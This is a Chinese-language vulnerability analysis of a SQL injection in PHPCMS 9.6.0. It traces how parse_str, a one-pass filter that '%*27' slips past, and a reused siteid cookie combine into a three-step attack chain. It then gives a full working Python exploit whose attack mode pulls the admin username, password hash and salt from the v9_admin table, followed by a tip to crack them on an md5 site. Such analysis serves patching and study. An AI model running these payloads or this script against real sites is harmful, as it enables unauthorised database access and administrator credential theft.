在9.6.1版本的补丁中，修复了两个安全漏洞(任意文件上传和sqql注入) , 我们先来学习以下sql注入漏洞的产生


漏洞产生的地方在`/phpcms/modules/content/down.php`文件中:

```
public function init() {
	$a_k = trim($_GET['a_k']);
	if(!isset($a_k)) showmessage(L('illegal_parameters'));
	$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));
	if(empty($a_k)) showmessage(L('illegal_parameters'));
	unset($i,$m,$f);
	parse_str($a_k);
	if(isset($i)) $i = $id = intval($i);
	if(!isset($m)) showmessage(L('illegal_parameters'));
	if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
	if(empty($f)) showmessage(L('url_invalid'));
	$allow_visitor = 1;
	$MODEL = getcache('model','commons');
	$tablename = $this->db->table_name = $this->db->db_tablepre.$MODEL[$modelid]['tablename'];
	$this->db->table_name = $tablename.'_data';
	$rs = $this->db->get_one(array('id'=>$id));	
	$siteids = getcache('category_content','commons');
	$siteid = $siteids[$catid];
	$CATEGORYS = getcache('category_content_'.$siteid,'commons');
	
	...
}
```


用sys_auth解密get传入的a_k参数，然后调用parse_str函数去变量解析， parse_str函数至少存在三个问题:

```
1. 带入未初始化的数据
2. 可以进行url编码
3. 变量覆盖漏洞
```

phpcms 这个sqli注入漏洞就利用了parse_str函数的前两个漏洞，首先$id未初始化，可以通过parse_str函数带入， 其次parse_str函数可以将%27转换为单引号

```
$a_k = "{"aid":0,"src":"&id=%27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=","filename":""}"
$catid = "1"
$f = "","filename":""}"
$id = "' and updatexml(1,concat(1,(user())),1)#"
```

如上是经过parse_str函数解析后的参数，可以看到`%27` 被解析成了单引号

最后$id被带入数据库查询导致sql注入产生:`$rs = $this->db->get_one(array('id'=>$id));	`

拼接后的sql语句为:

    SELECT * FROM `phpcmsv9`.`v9_news_data` WHERE `id` = '' and updatexml(1,concat(1,(user())),1)#' LIMIT 1 

那么获取$a_k的值呢？  $a_k 是通过phpcms的sys_auth函数加密后的值， 这个函数在`/phpcms/libs/classes/param.class.php` 文件的set_cookie, get_cookie有调用，因此我们去寻找搜索以下`param::set_cookie`, 在attachment 模块部分发现一个显而易见的操控点

```
public function swfupload_json() {
	$arr['aid'] = intval($_GET['aid']);
	$arr['src'] = safe_replace(trim($_GET['src']));
	$arr['filename'] = urlencode(safe_replace($_GET['filename']));
	$json_str = json_encode($arr);
	$att_arr_exist = param::get_cookie('att_json');
	$att_arr_exist_tmp = explode('||', $att_arr_exist);
	if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
		return true;
	} else {
		$json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
		param::set_cookie('att_json',$json_str);
		return true;			
	}
}
```

不过再执行swfupload_json 需要一点条件， attachement.php的控制器文件的构造函数如下：

```
function __construct() {
	pc_base::load_app_func('global');
	$this->upload_url = pc_base::load_config('system','upload_url');
	$this->upload_path = pc_base::load_config('system','upload_path');		
	$this->imgext = array('jpg','gif','png','bmp','jpeg');
	$this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
	$this->isadmin = $this->admin_username = $_SESSION['roleid'] ? 1 : 0;
	$this->groupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8;
	//判断是否登录
	if(empty($this->userid)){
		showmessage(L('please_login','','member'));
	}
}
```

调用param:get-cookie 从cookie里面获取user_id加密值，如果解密后不为空， 就判断已经登录

我们只需要找一个可能得到加密值的地方就行

这就来到`/phpcms/modules/wap/index.php` 中：

```
function __construct() {		
	$this->db = pc_base::load_model('content_model');
	$this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
	param::set_cookie('siteid',$this->siteid);	
	$this->wap_site = getcache('wap_site','wap');
	$this->types = getcache('wap_type','wap');
	$this->wap = $this->wap_site[$this->siteid];
	define('WAP_SITEURL', $this->wap['domain'] ? $this->wap['domain'].'index.php?' : APP_PATH.'index.php?m=wap&siteid='.$this->siteid);
	if($this->wap['status']!=1) exit(L('wap_close_status'));
}
```

这里调用了set_cookie 因此我们可以很轻松的得到一个可操控的加密值(注意site_id 调用了intval函数，无法直接传入我们payload, 只能得到整数值)。

整个利用过程我们可以分成三步:

### 第一步 

第一步: 我们访问`http://localhost/index.php?m=wap&a=index&siteid=1` 即可得到一个合法的siteid加密值,把这个siteid替换成userid即可绕过attachement.php中的登录限制


我们接着看swfupload_json函数， json_str是cookie的内容，而json_str又是由这三部分组成
```
$arr['aid'] = intval($_GET['aid']);
$arr['src'] = safe_replace(trim($_GET['src']));
$arr['filename'] = urlencode(safe_replace($_GET['filename']));
$json_str = json_encode($arr);
```

这三个参数， aid用了intval,filename用了urlencode和safe_replace函数，src用safe_replace函数过滤，那么这个函数是否可以绕过呢？  答案是的，我们来看下这个函数的定义，在`phpcms/libs/functions/global.func.php`文件中:

```
function safe_replace($string) {
	$string = str_replace('%20','',$string);
	$string = str_replace('%27','',$string);
	$string = str_replace('%2527','',$string);
	$string = str_replace('*','',$string);
	$string = str_replace('"','&quot;',$string);
	$string = str_replace("'",'',$string);
	$string = str_replace('"','',$string);
	$string = str_replace(';','',$string);
	$string = str_replace('<','&lt;',$string);
	$string = str_replace('>','&gt;',$string);
	$string = str_replace("{",'',$string);
	$string = str_replace('}','',$string);
	$string = str_replace('\\','',$string);
	return $string;
}
```

函数将敏感字符替换为空，但问题是只执行一次，所以当输入是%*27时*被过滤，进而可以得到%27。 %27 在parse_str函数中被解码成后就可以带入一个单引号了。


### 第二步

我们带着第一步得到的userid的值，访问第二个连接，并且构造我们的payload

    http://localhost/index.php?m=attachment&c=attachments&a=swfupload_json&src=&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f=
    

在swfupload_json函数中会返回一个响应cookie:`MPkO_att_json=a4ccFfjVcOKqub4EbK66IZvqFPm2zuSaSmrcy-Hzq7RM4eTO9J3Zw7ZUiI8LX5dup9GJWjFQmTjxfJpdp6cvIm5Ps9-HKDXh7eS9Ir1lnZhfrmEtJ8RF9eyjB-GNmojU0fZ4yEacluZaEf3lR_oiBhIGb6mVggA9uaZx3Q6UO1BPW6LDm3M;`

这个加密cookie值就是我们构造的payload, 我们只需要传入开始我们分析的那个$a_k参数中即可触发漏洞:

### 第三步

第三步访问链接: 

    http://localhost/index.php?m=content&c=down&a=init&a_k=a4ccFfjVcOKqub4EbK66IZvqFPm2zuSaSmrcy-Hzq7RM4eTO9J3Zw7ZUiI8LX5dup9GJWjFQmTjxfJpdp6cvIm5Ps9-HKDXh7eS9Ir1lnZhfrmEtJ8RF9eyjB-GNmojU0fZ4yEacluZaEf3lR_oiBhIGb6mVggA9uaZx3Q6UO1BPW6LDm3M
    
即可触发sql注入漏洞:

exp:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
phpcmsv9.6.0 sqli verify and attach poc
"""

import requests
import re
from urllib import quote

TIMEOUT = 3


def poc(url,payload):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    # use "*" to bypass filter "safe_replace()" in PHPCMS
    #payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="
    
    cookies = {}
    #print 'step1'
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    #print 'step1',step1
    for c in requests.get(step1, timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False
    
    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    #print 'step2:',step2,cookies
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            break
    else:
        return False

    #print c
    step3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
    #print 'step3:',step3
    r = requests.get(step3, cookies=cookies, timeout=TIMEOUT)
    result = re.findall('XPATH syntax error: \'(.*?)\'', r.content)
    if result[0]:
        return result[0]


def verify(url):
    print 'verify poc start'
    payload = "&id=%*27 and updatexml(1,concat(1,(select user())),1)%23&modelid=1&catid=1&m=1&f="
    print poc(url,payload)


def attack(url):
    print 'attach poc start'
    payload = "&id=%*27 and updatexml(1,concat(1,(select concat(username,0x3a,encrypt) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
    username,salt = poc(url,payload).split(':')
    payload = "&id=%*27 and updatexml(1,concat(1,(select concat(0x3a,password) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
    password1 = poc(url,payload)
    payload = "&id=%*27 and updatexml(1,concat(1,(select concat(password) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
    password2 = poc(url,payload)[-1]
    print 'username:',username
    print 'password:',password1+password2
    print 'salt:',salt
if __name__ == '__main__':
    #print poc('http://localhost/')
    verify('http://localhost/')
```




拿到password和salt后就可以去md5上面解密了，类型选择dz,格式 password:salt

